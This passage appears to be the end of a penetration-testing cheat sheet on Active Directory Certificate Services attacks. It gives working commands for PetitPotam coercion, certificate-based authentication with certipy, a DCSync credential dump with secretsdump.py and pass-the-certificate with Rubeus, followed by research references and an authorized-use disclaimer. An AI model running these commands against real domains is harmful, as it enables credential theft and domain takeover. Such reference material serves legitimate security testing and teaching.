python3 PetitPotam.py 192.168.10.99 192.168.10.10

# ════════════════════════════════════════════════════
#  AUTHENTICATION
# ════════════════════════════════════════════════════
# Get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10

# DCSync
secretsdump.py -hashes 'aad3b435...:NTLMHASH' \
  'corp.local/administrator@192.168.10.10'

# Pass-the-Certificate (Windows)
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx \
  /password:'' /domain:corp.local /dc:192.168.10.10 /ptt
```

---

## References

1. **Certified Pre-Owned** — Will Schroeder & Lee Christensen (SpecterOps, 2021)
   [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

2. **Certipy** — Oliver Lyak
   [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

3. **Certipy 4.0 — ESC9/ESC10 Research**
   [https://research.ifcr.dk/certipy-4-0-esc9-esc10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-new-authentication-and-request-methods-and-more-7237d88061f7)

4. **ESC11 — Compass Security Research**
   [https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)

5. **PetitPotam**
   [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)

6. **GhostPack/Certify**
   [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

7. **BloodHound ADCS Attack Paths**
   [https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf)

---

*For authorized security testing and educational purposes only.*
